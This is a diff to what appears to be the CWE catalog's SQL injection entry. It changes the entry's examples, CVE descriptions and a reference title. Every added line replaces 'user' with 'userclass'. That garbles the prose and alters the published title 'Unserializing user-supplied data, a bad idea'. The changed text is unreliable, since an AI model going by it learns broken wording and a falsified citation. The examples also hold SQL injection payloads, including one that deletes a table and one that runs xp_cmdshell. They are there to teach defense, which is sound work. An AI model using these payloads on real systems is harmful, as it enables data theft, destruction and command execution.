-               <Intro_Text>The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where owner matches the user name of the currently-authenticated user.</Intro_Text>
+               <Intro_Text>The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where owner matches the userclass name of the currently-authenticated userclass.</Intro_Text>
                <Example_Code Nature="bad" Language="C#">
                   <xhtml:div>...<xhtml:br/>string userName = ctx.getAuthenticatedUserName();<xhtml:br/>string query = "SELECT * FROM items WHERE owner = '" + userName + "' AND itemname = '" + ItemName.Text + "'";<xhtml:br/>sda = new SqlDataAdapter(query, conn);<xhtml:br/>DataTable dt = new DataTable();<xhtml:br/>sda.Fill(dt);<xhtml:br/>...</xhtml:div>
                </Example_Code>
@@ -11844,7 +11844,7 @@
                <Example_Code Nature="informative">
                   <xhtml:div>SELECT * FROM items WHERE owner = &lt;userName&gt; AND itemname = &lt;itemName&gt;;</xhtml:div>
                </Example_Code>
-               <Body_Text>However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string:</Body_Text>
+               <Body_Text>However, because the query is constructed dynamically by concatenating a constant base query string and a userclass input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the userclass name wiley enters the string:</Body_Text>
                <Example_Code Nature="attack">
                   <xhtml:div>name' OR 'a'='a</xhtml:div>
                </Example_Code>
@@ -11860,11 +11860,11 @@
                <Example_Code Nature="attack">
                   <xhtml:div>SELECT * FROM items;</xhtml:div>
                </Example_Code>
-               <Body_Text>This simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated user; the query now returns all entries stored in the items table, regardless of their specified owner.</Body_Text>
+               <Body_Text>This simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated userclass; the query now returns all entries stored in the items table, regardless of their specified owner.</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example>
                <Intro_Text>This example examines the effects of a different malicious value passed to the query constructed and executed in the previous example.</Intro_Text>
-               <Body_Text>If an attacker with the user name wiley enters the string:</Body_Text>
+               <Body_Text>If an attacker with the userclass name wiley enters the string:</Body_Text>
                <Example_Code Nature="attack">
                   <xhtml:div>name'; DELETE FROM items; --</xhtml:div>
                </Example_Code>
@@ -11912,7 +11912,7 @@
                   <xhtml:div>SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='$user_input' ORDER BY PRICE</xhtml:div>
                </Example_Code>
                <Body_Text>Where $user_input is taken from an untrusted source.</Body_Text>
-               <Body_Text>If the user provides the string:</Body_Text>
+               <Body_Text>If the userclass provides the string:</Body_Text>
                <Example_Code Nature="attack">
                   <xhtml:div>'; exec master..xp_cmdshell 'dir' --</xhtml:div>
                </Example_Code>
@@ -11955,17 +11955,17 @@
                <Example_Code Nature="good" Language="PHP">
                   <xhtml:div>$id = intval($_COOKIE["mid"]);<xhtml:br/>mysql_query("SELECT MessageID, Subject FROM messages WHERE MessageID = '$id'");</xhtml:div>
                </Example_Code>
-               <Body_Text>However, if this code is intended to support multiple users with different message boxes, the code might also need an access control check (CWE-285) to ensure that the application user has the permission to see that message.</Body_Text>
+               <Body_Text>However, if this code is intended to support multiple users with different message boxes, the code might also need an access control check (CWE-285) to ensure that the application userclass has the permission to see that message.</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example>
-               <Intro_Text>This example attempts to take a last name provided by a user and enter it into a database.</Intro_Text>
+               <Intro_Text>This example attempts to take a last name provided by a userclass and enter it into a database.</Intro_Text>
                <Example_Code Nature="bad" Language="Perl">
                   <xhtml:div>$userKey = getUserID();<xhtml:br/>$name = getUserInput();<xhtml:br/>
                      <xhtml:br/>
                      <xhtml:i># ensure only letters, hyphens and apostrophe are allowed</xhtml:i>
                      <xhtml:br/>$name = allowList($name, "^a-zA-z'-$");<xhtml:br/>$query = "INSERT INTO last_names VALUES('$userKey', '$name')";</xhtml:div>
                </Example_Code>
-               <Body_Text>While the programmer applies a allowlist to the user input, it has shortcomings. First of all, the user is still allowed to provide hyphens, which are used as comment structures in SQL. If a user specifies "--" then the remainder of the statement will be treated as a comment, which may bypass security logic. Furthermore, the allowlist permits the apostrophe, which is also a data / command separator in SQL. If a user supplies a name with an apostrophe, they may be able to alter the structure of the whole statement and even change control flow of the program, possibly accessing or modifying confidential information. In this situation, both the hyphen and apostrophe are legitimate characters for a last name and permitting them is required. Instead, a programmer may want to use a prepared statement or apply an encoding routine to the input to prevent any data / directive misinterpretations.</Body_Text>
+               <Body_Text>While the programmer applies a allowlist to the userclass input, it has shortcomings. First of all, the userclass is still allowed to provide hyphens, which are used as comment structures in SQL. If a userclass specifies "--" then the remainder of the statement will be treated as a comment, which may bypass security logic. Furthermore, the allowlist permits the apostrophe, which is also a data / command separator in SQL. If a userclass supplies a name with an apostrophe, they may be able to alter the structure of the whole statement and even change control flow of the program, possibly accessing or modifying confidential information. In this situation, both the hyphen and apostrophe are legitimate characters for a last name and permitting them is required. Instead, a programmer may want to use a prepared statement or apply an encoding routine to the input to prevent any data / directive misinterpretations.</Body_Text>
             </Demonstrative_Example>
          </Demonstrative_Examples>
          <Observed_Examples>
@@ -11986,12 +11986,12 @@
             </Observed_Example>
             <Observed_Example>
                <Reference>CVE-2007-6602</Reference>
-               <Description>SQL injection via user name.</Description>
+               <Description>SQL injection via userclass name.</Description>
                <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6602</Link>
             </Observed_Example>
             <Observed_Example>
                <Reference>CVE-2008-5817</Reference>
-               <Description>SQL injection via user name or password fields.</Description>
+               <Description>SQL injection via userclass name or password fields.</Description>
                <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5817</Link>
             </Observed_Example>
             <Observed_Example>
@@ -12861,7 +12861,7 @@
 		</External_Reference>
       <External_Reference Reference_ID="REF-464">
 			<Author>Heine Deelstra</Author>
-			<Title>Unserializing user-supplied data, a bad idea</Title>
+			<Title>Unserializing userclass-supplied data, a bad idea</Title>
 			<Publication_Year>2010</Publication_Year>
 			<Publication_Month>--08</Publication_Month>
 			<Publication_Day>---25</Publication_Day>
